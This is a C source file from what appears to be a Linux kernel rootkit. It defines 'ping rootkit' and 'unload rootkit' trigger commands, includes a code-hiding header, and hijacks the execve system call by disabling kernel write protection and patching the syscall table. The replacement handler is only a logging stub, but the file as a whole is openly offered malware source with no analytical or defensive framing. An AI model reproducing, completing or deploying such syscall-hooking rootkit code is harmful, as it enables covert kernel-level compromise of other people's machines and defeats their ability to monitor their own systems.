#include "execve_hooking.h"
#include "hooking.h"
#include "code_hiding.h"

#define CR 13
#define DEL 127
static const char * pingCommand = "ping rootkit";
const int pingCommandLen = 12;
static int checkPingCommandCount = 0;
static const char * unloadCommand = "unload rootkit";
const int unloadCommandLen = 14;
static int checkUnloadCommandCount = 0;

long (*orig_sys_execve)(const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp);
asmlinkage int my_execve(const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp){
  printk(KERN_INFO "changed");
  return do_execve(filename, argv, envp);
}

void hook_execve(void){
  disable_wp();
  orig_sys_execve = syscall_table[__NR_execve];
  syscall_table[__NR_execve] = my_execve;
  enable_wp();
}

void unhook_execve(void){
  disable_wp();
  syscall_table[__NR_execve] = orig_sys_execve;
  enable_wp();
}
